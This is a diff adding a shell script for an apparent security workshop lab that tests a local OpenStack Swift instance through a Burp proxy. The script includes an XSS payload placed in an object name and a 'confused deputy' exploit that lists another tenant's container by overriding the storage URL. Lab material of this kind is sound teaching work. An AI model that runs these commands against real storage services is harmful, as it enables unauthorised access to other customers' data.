@@ -1,0 +1,131 @@
+# Assumes Linux
+
+
+export LAB_OPENSTACK_IP=172.31.26.154
+
+
+ping -c 2 $LAB_OPENSTACK_IP
+
+mkdir -p $HOME/Downloads
+cd $HOME/Downloads
+
+
+
+curl --insecure --include https://${LAB_OPENSTACK_IP}:8080/healthcheck
+
+
+
+pip install python-swiftclient
+
+
+# You might have to add the installed binary directory to your path
+export PATH=$PATH:$HOME/.local/bin
+
+
+swift --insecure --auth=https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U system:root -K testpass --verbose stat
+
+
+
+# Burp Setup commands
+
+export https_proxy=http://localhost:8080
+
+
+# repeat test command
+swift --insecure --auth=https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U system:root -K testpass --verbose stat
+
+
+# Another test command
+
+echo $USER > sample_object.txt
+
+
+
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U system:root -K testpass upload bsides-workshop sample_object.txt
+
+
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U system:root -K testpass list
+
+
+
+
+
+# XSS testing
+
+echo $USER > sample_object.txt
+
+
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U system:root -K testpass upload fileuploads ./sample_object.txt
+
+
+
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U system:root -K testpass copy fileuploads sample_object.txt -d '/fileuploads/easytest<script>alert("you been pwned")</script>forme'
+
+
+
+
+# These are for IAM testing later
+
+echo $USER > sample_object.txt
+
+
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U account1:normal -K expected list
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U account1:normal -K expected list deptdocs
+
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U account2:somebody -K else list
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U account2:somebody -K else list research
+
+
+
+# Two Separate Customers
+
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U account1:normal -K expected list research
+
+
+# Changing Accounts - CLI
+
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U account1:normal -K expected list   --os-storage-url https://${LAB_OPENSTACK_IP}:8080/v1/AUTH_account1
+
+
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U account1:normal -K expected list   --os-storage-url https://${LAB_OPENSTACK_IP}:8080/v1/AUTH_account2
+
+
+
+# Confused-Deputy - Attacker
+
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U codeerror:unexpecteduser -K shouldnothappen list
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U codeerror:unexpecteduser -K shouldnothappen list warez
+
+
+
+# Confused-Deputy Exploit
+
+swift --insecure -A https://${LAB_OPENSTACK_IP}:8080/auth/v1.0 -U codeerror:unexpecteduser -K shouldnothappen list research  --os-storage-url https://${LAB_OPENSTACK_IP}:8080/v1/AUTH_account2
+
+
+
+# ======================================
+
+# Google cloud setup
+
+
+gcloud init
+
+
+# Burp Setup
+
+export https_proxy=http://localhost:8080
+
+
+curl.exe --output burp-ca.der http://localhost:8080/cert
+
+# Use Windows GUI to convert the der to base64 pem
+# Linux/Mac users can use command-line
+
+openssl x509 -inform der -in burp-ca.der -out burp-ca.cer
+
+export CLOUDSDK_CORE_custom_ca_certs_file=$pwd/burp-ca.cer
+
+
+
+gcloud projects list
